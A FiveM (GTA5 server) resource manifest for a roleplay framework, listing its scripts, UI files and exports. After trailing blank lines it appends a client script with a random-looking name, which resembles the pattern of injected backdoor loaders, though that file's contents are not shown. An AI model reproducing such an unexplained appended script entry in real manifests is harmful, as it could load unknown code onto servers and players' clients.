lua54 'yes'
client_script 'validation.lua'

shared_script '@WaveShield/resource/waveshield.lua' --this line was automatically written by WaveShield

fx_version 'bodacious'
game 'gta5'


client_script "@sr_main/client/def.lua"

server_scripts { 
	'@chat/async.lua',
	'@oxmysql/lib/MySQL.lua',

	'locale.lua',
	'locales/fr.lua',
	'locales/en.lua',

	'config.lua',
	'config.weapons.lua',

	'server/util.lua',
	'server/common.lua',
	'server/functions.lua',
	'server/paycheck.lua',
	'server/main.lua',
	'server/db.lua',
	'server/classes/player.lua',
	'server/classes/groups.lua',
	'server/player/login.lua',
	'server/commands.lua',

	'shared/modules/math.lua',
	'shared/functions.lua'
}

client_scripts {
	'locale.lua',
	'locales/fr.lua',
	'locales/en.lua',

	'config.lua',
	'config.weapons.lua',
	'jaymenu.lua',
	'client/common.lua',
	'client/entityiter.lua',
	'client/functions.lua',
	'client/wrapper.lua',
	'client/main.lua',

	'client/modules/death.lua',
	'client/modules/scaleform.lua',
	'client/modules/streaming.lua',
	'client/modules/keymanager.lua',

	'shared/modules/math.lua',
	'shared/functions.lua'
}

ui_page {
	'html/ui.html'
}

files {
	'locale.js',
	'html/ui.html',
	'html/sound.mp3',

	'html/css/app.css',

	'html/js/*.js',

	'html/fonts/pdown.ttf',
	'html/fonts/bankgothic.ttf',
	'shared/data/vehicle_names.json',
	'html/img/accounts/bank.png',
	'html/img/accounts/black_money.png',
	'html/img/notificationImages/*.jpg'
}

exports {
	'getUser'
}

server_exports {
	'addAdminCommand',
	'addCommand',
	'addGroupCommand',
	'addACECommand',
	'canGroupTarget',
	'log',
	'debugMsg',
	'IcName',
	'GetPlayerICName',
}






client_script "IRS_USDUFHSILFSKOAKQA.lua"